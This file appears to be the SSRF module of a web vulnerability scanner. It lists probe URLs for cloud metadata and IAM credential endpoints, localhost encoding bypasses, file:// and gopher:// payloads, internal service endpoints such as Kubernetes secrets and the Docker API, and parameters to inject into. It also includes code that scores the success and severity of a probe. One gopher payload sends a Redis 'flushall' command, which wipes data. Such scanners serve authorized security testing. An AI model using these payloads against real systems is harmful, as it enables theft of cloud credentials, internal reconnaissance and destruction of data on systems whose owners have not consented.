"""
SSRF detection URLs and response analysis.

Expanded to cover:
- Cloud metadata endpoints (AWS, GCP, Azure, DigitalOcean)
- Protocol confusion (file://, gopher://, dict://)
- Localhost bypass variants (decimal, hex, octal, IPv6)
- DNS rebinding probes
- Internal service fingerprints (Kubernetes, Consul, etcd)
"""

import re

# ── SSRF probe URLs ───────────────────────────────────────────────────────────

# Cloud metadata — highest value, often unprotected
CLOUD_METADATA_URLS = [
    # AWS IMDSv1 (still widely deployed)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # AWS IMDSv2 (requires PUT first — but GET still reveals existence)
    "http://169.254.169.254/latest/api/token",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    # Oracle Cloud
    "http://169.254.169.254/opc/v1/instance/",
]

# Localhost bypass encoding variants
LOCALHOST_VARIANTS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://[::ffff:127.0.0.1]",
    "http://0177.0.0.1",        # octal
    "http://0x7f000001",         # hex
    "http://2130706433",         # decimal
    "http://127.1",              # short form
    "http://127.0.1",
    "http://0",                  # maps to 0.0.0.0
    "http://0.0.0.0",
]

# Protocol confusion
PROTOCOL_CONFUSION = [
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///windows/win.ini",
    "dict://127.0.0.1:6379/info",     # Redis
    "dict://localhost:11211/stats",   # Memcached
    "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a",
    "gopher://127.0.0.1:9200/_cat/indices",  # Elasticsearch
]

# Internal service fingerprinting
INTERNAL_SERVICES = [
    "http://localhost:8080",
    "http://localhost:8443",
    "http://localhost:8500/v1/agent/self",    # Consul
    "http://localhost:2379/v2/keys",          # etcd
    "http://localhost:9200/_cluster/health",  # Elasticsearch
    "http://localhost:6379",                  # Redis
    "http://localhost:27017",                 # MongoDB
    "http://localhost:5984",                  # CouchDB
    "http://10.0.0.1",                        # common gateway
    "http://192.168.1.1",                     # common router
    # Kubernetes API
    "http://kubernetes.default.svc/api",
    "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
    # Docker daemon
    "http://localhost:2375/v1.24/containers/json",
]

# Bypass via URL confusion
URL_CONFUSION = [
    "http://evil.example@127.0.0.1",
    "http://127.0.0.1#evil.example",
    "http://127.0.0.1%09evil.example",
    "http://127.0.0.1%20evil.example",
    "http://127.0.0.1%00evil.example",
    "http://evil.example.127.0.0.1.nip.io",
]

# Canonical list used by the executor
SSRF_TEST_URLS = (
    CLOUD_METADATA_URLS[:4] +    # Top 4 AWS/GCP first — highest signal
    LOCALHOST_VARIANTS[:6] +
    INTERNAL_SERVICES[:5] +
    PROTOCOL_CONFUSION[:2] +
    URL_CONFUSION[:3]
)

# ── SSRF parameters to inject into ───────────────────────────────────────────

SSRF_PARAMS = [
    # Direct URL params
    "url", "uri", "src", "dest", "destination", "redirect", "redirectUrl",
    "redirect_uri", "redirect_url", "return", "returnTo", "return_to",
    "returnUrl", "return_url", "next", "nextUrl", "next_url",
    # Fetch/webhook params
    "fetch", "fetch_url", "webhook", "webhook_url", "callback", "callbackUrl",
    "callback_url", "hook", "hookUrl", "endpoint", "target", "host",
    # File/content params
    "file", "filename", "path", "load", "link", "href", "image",
    "imageUrl", "image_url", "logo", "avatar", "photo", "pdf",
    # API integration params
    "api", "api_url", "service", "proxy", "remote", "resource",
]

# ── Response analysis ─────────────────────────────────────────────────────────

# Signatures that appear in cloud metadata, internal services, etc.
SSRF_SUCCESS_SIGNATURES = [
    # AWS metadata
    "ami-id", "ami-launch-index", "instance-id", "iam/security-credentials",
    "placement/availability-zone", "security-groups",
    # GCP metadata
    "computeMetadata", "project-id", "serviceAccounts",
    # Azure
    "azEnvironment", "resourceGroupName", "subscriptionId",
    # Internal services
    "redis_version", "connected_clients",      # Redis
    "elasticsearch", "cluster_name",           # Elasticsearch
    "consul", "serf", "raft",                  # Consul
    "etcd", "revision",                        # etcd
    "containers", "Containers",                # Docker
    # File contents
    "root:x:0:0", "daemon:", "bin/bash",       # /etc/passwd
    "[fonts]", "for 16-bit", "MSDOS",          # windows/win.ini
]

# Signals in response that suggest SSRF success even without exact string match
SSRF_BEHAVIOR_SIGNALS = [
    "internal", "localhost", "loopback", "127.0.0.1",
    "169.254", "10.0.", "192.168.", "172.16.", "172.17.",
    "metadata", "user-data", "instance", "credential",
]


def analyze_ssrf_response(baseline, test, probe_url: str = "") -> bool:
    """
    Detect SSRF success by comparing baseline vs probe response.

    Returns True if:
    - Status code changed (200 vs 4xx/5xx)
    - Response body contains cloud/internal service signatures
    - Response length differs significantly
    - Response time differs significantly (blind SSRF)
    """
    # Status code change — most reliable signal
    if baseline.status_code != test.status_code:
        # 200 on a metadata URL = confirmed SSRF
        if test.status_code == 200:
            return True
        # Any status change is suspicious
        if abs(baseline.status_code - test.status_code) >= 100:
            return True

    body_lower = test.text.lower()

    # Cloud/internal service signatures
    for sig in SSRF_SUCCESS_SIGNATURES:
        if sig.lower() in body_lower:
            return True

    # Behavior signals in body
    for sig in SSRF_BEHAVIOR_SIGNALS:
        if sig in body_lower:
            return True

    # Significant response length change (>500 bytes different = suspicious)
    if abs(len(test.text) - len(baseline.text)) > 500:
        if test.status_code == 200:
            return True

    # Metadata URL probe — even a non-200 that differs from baseline is interesting
    if probe_url and "169.254.169.254" in probe_url:
        if test.status_code != baseline.status_code:
            return True

    return False


def classify_ssrf_severity(probe_url: str, response_body: str) -> str:
    """Classify SSRF finding severity based on what was accessed."""
    body_lower = response_body.lower()

    if any(s in body_lower for s in ["iam/security-credentials", "serviceaccounts",
                                      "subscriptionid", "access_key"]):
        return "critical"  # Cloud credentials exposed

    if any(s in body_lower for s in ["ami-id", "instance-id", "computemetadata",
                                      "azenvironment"]):
        return "high"  # Cloud metadata (no creds but still high)

    if any(s in body_lower for s in ["root:x:0:0", "redis_version",
                                      "elasticsearch", "containers"]):
        return "high"  # Internal file / service access

    if "169.254" in probe_url or "metadata" in probe_url:
        return "high"

    return "medium"
